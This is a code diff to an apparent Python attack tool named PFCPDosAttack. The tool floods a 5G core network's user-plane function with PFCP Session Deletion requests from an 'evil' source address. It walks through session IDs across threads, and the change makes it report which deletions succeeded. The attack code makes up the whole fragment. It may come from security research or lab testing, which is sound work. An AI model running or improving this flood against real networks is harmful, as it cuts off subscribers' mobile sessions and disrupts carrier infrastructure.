@@ -296,8 +296,10 @@ class Ez_PFCP:
             if isinstance(ie, IE_Cause):
                 pfcp_cause = ie.cause
                 break
+        if self.verbose:
+            print(f"[EZ-PFCP] PFCP Session Deletion response received with cause: {pfcp_cause}")
+        return pfcp_cause
         
-        print(f"[EZ-PFCP] PFCP Session Deletion response received with cause: {pfcp_cause}")
         
 
         
@@ -334,6 +336,8 @@ class PFCPDosAttack:
         self.random_far_number = random_far_number
         
         self.smf_addr = smf_addr
+        self.SESSION_CONTEXT_NOT_FOUND = 65
+        self.REQUEST_ACCEPTED = 1
         
     def set_random_far_number(self, random_far_number=15):
         self.random_far_number = random_far_number
@@ -478,16 +482,18 @@ class PFCPDosAttack:
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
         for i in range(start_index, start_index+count): 
             try:
-                pfcp_obj.Send_PFCP_session_deletion_req(seid=i)
-                
+                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i)
+
+                    
+                if response == self.REQUEST_ACCEPTED:
+                    print(f"[DoS][Worker] PFCP session deletion request accepted; SEID: {i}")
+                    
             except Exception as e:
                 print(f"[DoS][Worker] Error sending PFCP session deletion request: {e}") 
                 
     
     def Start_pfcp_session_deletion_flood(self, reqNbr=100, num_threads=1):
-        if self.prepare:
-            self.prepare_pfcp_session_deletion_flood(reqNbr)
-            
+
         if self.verbose:
             print(f"[DoS] Starting PFCP session deletion flood with {reqNbr} requests and {num_threads} threads")
 
@@ -496,6 +502,7 @@ class PFCPDosAttack:
         remaining = reqNbr % num_threads
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
         thread_offset = 0
+        start_time = time.time()
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
             t = threading.Thread(target=self.pfcp_session_deletion_flood_worker, args=(count,))
